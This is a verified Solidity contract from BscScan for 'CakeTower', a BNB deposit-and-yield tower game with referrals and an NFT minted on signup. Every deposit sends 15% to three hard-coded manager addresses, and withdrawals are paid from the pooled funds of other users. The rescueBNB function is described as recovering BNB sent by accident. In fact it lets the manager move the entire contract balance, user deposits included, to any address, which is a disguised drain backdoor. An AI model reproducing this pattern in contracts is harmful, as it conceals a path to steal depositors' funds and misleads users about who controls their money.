/**
 *Submitted for verification at BscScan.com on 2023-08-28
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

// contract interface
interface NftMintInterface {
    // function definition of the method we want to interact with
    function mint(address to) external;
}

contract CakeTower {
    struct Tower {
        uint256 coins;
        uint256 money;
        uint256 money2;
        uint256 yield;
        uint256 timestamp;
        uint256 hrs;
        address ref;
        uint256 refs;
        uint256 refDeps;
        uint8[8] chefs;
    }
    mapping(address => Tower) public towers;
    uint256 public totalChefs;
    uint256 public totalTowers;
    uint256 public totalInvested;
    address public manager = 0x0B92Ff4A645DcEdC468b5684dc5C4963Bc28228A;
    address public manager1 = 0xeB244Ca05285162cbd0a58a542C86b48dFab74d4; 
    address public manager2 = 0xd9e38507275473fCD9e4489238000525707d6121; 
    uint256 public startUNIX;
    NftMintInterface public NFTContract= NftMintInterface(0x905ddB0c02562cBa849CFfd2f3736DcF9744E06b);
  
    constructor(uint256 startDate){
        require(startDate > 0);
        startUNIX = startDate;
    }

    function addCoins(address ref) public payable {
        require(block.timestamp > startUNIX, "We are not live yet!");
        uint256 coins = msg.value / 2e13;
        require(coins > 0, "Zero coins");
        address user = msg.sender;
        totalInvested += msg.value;
        if (towers[user].timestamp == 0) {
            totalTowers++;
            ref = towers[ref].timestamp == 0 ? manager : ref;
            towers[ref].refs++;
            towers[user].ref = ref;
            towers[user].timestamp = block.timestamp;
            NFTContract.mint(msg.sender);
        }
        ref = towers[user].ref;
        towers[ref].coins += (coins * 7) / 100;
        towers[ref].money += (coins * 100 * 3) / 100;
        towers[ref].refDeps += coins;
        towers[user].coins += coins;
        payable(manager).transfer((msg.value * 5) / 100);
        payable(manager1).transfer((msg.value * 5) / 100);
        payable(manager2).transfer((msg.value * 5) / 100);
    }

    function withdrawMoney() public {
        address user = msg.sender;
        uint256 money = towers[user].money;
        towers[user].money = 0;
        uint256 amount = money * 2e11;
        payable(user).transfer(address(this).balance < amount ? address(this).balance : amount);
    }

    function collectMoney() public {
        address user = msg.sender;
        syncTower(user);
        towers[user].hrs = 0;
        towers[user].money += towers[user].money2;
        towers[user].money2 = 0;
    }

    function upgradeTower(uint256 floorId) public {
        require(floorId < 8, "Max 8 floors");
        address user = msg.sender;
        syncTower(user);
        towers[user].chefs[floorId]++;
        totalChefs++;
        uint256 chefs = towers[user].chefs[floorId];
        towers[user].coins -= getUpgradePrice(floorId, chefs);
        towers[user].yield += getYield(floorId, chefs);
    }

    
    modifier onlyOwnerOrManager() {
        require(msg.sender == manager, "");
        _;
    }

    // Rescue BNB accidentally sent to the contract
    function rescueBNB(address payable to, uint256 amount) public onlyOwnerOrManager {
        require(to != address(0), "Invalid recipient address");
        require(address(this).balance >= amount, "Invalid");
        
        to.transfer(amount);
    }
    


    function getChefs(address addr) public view returns (uint8[8] memory) {
        return towers[addr].chefs;
    }

    function syncTower(address user) internal {
        require(towers[user].timestamp > 0, "User is not registered");
        if (towers[user].yield > 0) {
            uint256 hrs = block.timestamp / 3600 - towers[user].timestamp / 3600;
            if (hrs + towers[user].hrs > 24) {
                hrs = 24 - towers[user].hrs;
            }
            towers[user].money2 += hrs * towers[user].yield;
            towers[user].hrs += hrs;
        }
        towers[user].timestamp = block.timestamp;
    }

    function getUpgradePrice(uint256 floorId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [500, 1500, 4500, 13500, 40500, 120000, 365000, 1000000][floorId];
        if (chefId == 2) return [625, 1800, 5600, 16800, 50600, 150000, 456000, 1200000][floorId];
        if (chefId == 3) return [780, 2300, 7000, 21000, 63000, 187000, 570000, 1560000][floorId];
        if (chefId == 4) return [970, 3000, 8700, 26000, 79000, 235000, 713000, 2000000][floorId];
        if (chefId == 5) return [1200, 3600, 11000, 33000, 98000, 293000, 890000, 2500000][floorId];
        revert("Incorrect chefId");
    }

    function getYield(uint256 floorId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [41, 130, 399, 1220, 3750, 11400, 36200, 104000][floorId];
        if (chefId == 2) return [52, 157, 498, 1530, 4700, 14300, 45500, 126500][floorId];
        if (chefId == 3) return [65, 201, 625, 1920, 5900, 17900, 57200, 167000][floorId];
        if (chefId == 4) return [82, 264, 780, 2380, 7400, 22700, 72500, 216500][floorId];
        if (chefId == 5) return [103, 318, 995, 3050, 9300, 28700, 91500, 275000][floorId];
        revert("Incorrect chefId");
    }
}